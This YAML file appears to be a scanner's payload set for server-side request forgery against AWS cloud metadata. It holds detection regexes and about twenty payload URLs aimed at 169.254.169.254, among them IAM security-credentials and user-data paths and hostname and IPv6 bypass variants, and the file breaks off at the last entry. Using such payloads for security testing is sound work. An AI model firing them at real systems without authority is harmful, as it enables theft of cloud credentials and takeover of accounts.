metadata:
  type: ssrf/cloud
  version: "1.0"
  description: "Cloud metadata SSRF payloads"
  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]

detection_patterns:
  - "(?i)ami-id"
  - "(?i)instance-id"
  - "(?i)metadata.*?compute"
  - "(?i)169\\.254\\.169\\.254"
  - "(?i)instance-identity"

payloads:
  aws:
    - value: "http://169.254.169.254/latest/meta-data/"
      description: "AWS metadata root"
      severity: critical
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/ami-id"
      description: "AWS AMI ID"
      severity: critical
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/instance-id"
      description: "AWS instance ID"
      severity: critical
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/instance-type"
      description: "AWS instance type"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/hostname"
      description: "AWS hostname"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/local-hostname"
      description: "AWS local hostname"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/local-ipv4"
      description: "AWS local IPv4"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/public-hostname"
      description: "AWS public hostname"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/public-ipv4"
      description: "AWS public IPv4"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/security-groups"
      description: "AWS security groups"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      description: "AWS IAM security credentials"
      severity: critical
      tags: [aws, iam]

    - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm"
      description: "AWS IAM EC2 credentials"
      severity: critical
      tags: [aws, iam]

    - value: "http://169.254.169.254/latest/meta-data/network/interfaces/macs/"
      description: "AWS network interfaces"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/user-data/"
      description: "AWS user data"
      severity: critical
      tags: [aws, user_data]

    - value: "http://169.254.169.254/latest/dynamic/instance-identity/document"
      description: "AWS instance identity"
      severity: high
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/placement/availability-zone"
      description: "AWS availability zone"
      severity: medium
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/block-device-mapping/"
      description: "AWS block device mapping"
      severity: medium
      tags: [aws, metadata]

    - value: "http://169.254.169.254/latest/meta-data/elastic-miscellaneous/"
      description: "AWS elastic IPs"
      severity: medium
      tags: [aws, metadata]

    - value: "http://instance-data/latest/meta-data/"
      description: "AWS instance-data hostname"
      severity: critical
      tags: [aws, metadata, bypass]

    - value: "http://[fd00:ec2::254]/latest/meta-data/"
      description: "AWS IPv6 metadata"
